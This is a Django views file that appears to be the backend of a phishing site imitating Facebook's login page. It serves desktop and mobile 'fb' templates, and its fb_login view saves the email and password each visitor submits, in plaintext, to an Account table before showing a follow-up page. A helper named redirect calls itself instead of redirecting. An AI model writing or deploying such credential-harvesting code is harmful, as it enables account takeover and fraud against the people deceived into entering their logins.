from django.shortcuts import render
from django.template import RequestContext
from django.http import HttpResponse
from django.template import loader
from .models import Account
from django.template.context_processors import csrf
from django.views.decorators.csrf import csrf_protect
import requests
from django.views.decorators.http import require_http_methods

def index(request):
	template = loader.get_template('index-desktop.html')
	if request.user_agent.is_mobile:
		template = loader.get_template('index-mobile.html')
	return HttpResponse(template.render())

def login(request):
	return ''

def test(request):
	NewAcc = Account.objects.create(login='test',passwd='test')
	return HttpResponse('Test')

@csrf_protect
def fb_login(request):
	if request.method == 'GET':
		c = {}
		if request.user_agent.is_mobile:
			return render(request, 'fb-mobile.html', c)
		return render(request, 'fb-desktop.html', c)
	else:
		NewAcc = Account.objects.create(login=request.POST.get('email',''), passwd=request.POST.get('pass',''))
		c = {}
		if request.user_agent.is_mobile:
			return render(request, 'fb-mobile-post.html', c)
		return render(request, 'fb-desktop-post.html', c)

def redirect(request, path):
	return redirect('static/'+path)